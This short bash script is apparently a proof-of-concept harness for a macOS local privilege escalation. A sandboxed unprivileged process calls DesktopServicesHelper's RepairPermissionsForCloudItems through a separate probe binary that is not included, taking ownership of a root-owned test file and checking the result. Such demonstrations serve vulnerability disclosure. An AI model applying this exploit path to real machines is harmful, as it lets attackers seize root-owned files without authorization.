#!/bin/bash
# Canonical PoC: sandboxed unprivileged process -> chown arbitrary root-owned file to attacker
set +e
PROBE=/Users/test/dsh_repair_probe
echo "== macOS =="; sw_vers; echo "build: $(sw_vers -buildVersion)  arch: $(uname -m)"
echo "== attacker identity =="; id
echo
echo "== STEP 1: a root-owned, attacker-inaccessible file =="
T=/tmp/poc_target
echo test | sudo -S sh -c "echo SECRET_ROOT_DATA > '$T'; chown root:wheel '$T'; chmod 600 '$T'"
ls -ln "$T"
echo "attacker read attempt BEFORE: $(cat "$T" 2>&1)"
echo
echo "== STEP 2: sandboxed attacker invokes DesktopServicesHelper RepairPermissionsForCloudItems =="
echo "sandbox profile: (version 1)(allow default)  [proves no special entitlement needed]"
sandbox-exec -p '(version 1)(allow default)' "$PROBE" "$T" 2>&1 | sed -n '1,4p'
sleep 1
echo
echo "== STEP 3: result =="
ls -ln "$T"
echo "attacker read attempt AFTER:  $(cat "$T" 2>&1)"
echo "OWNER: $(stat -f '%Su' "$T")  -> $([ "$(stat -f '%Su' "$T")" = "test" ] && echo 'ATTACKER NOW OWNS ROOT FILE (read+write+chmod)' || echo 'no change')"
echo test | sudo -S rm -f "$T"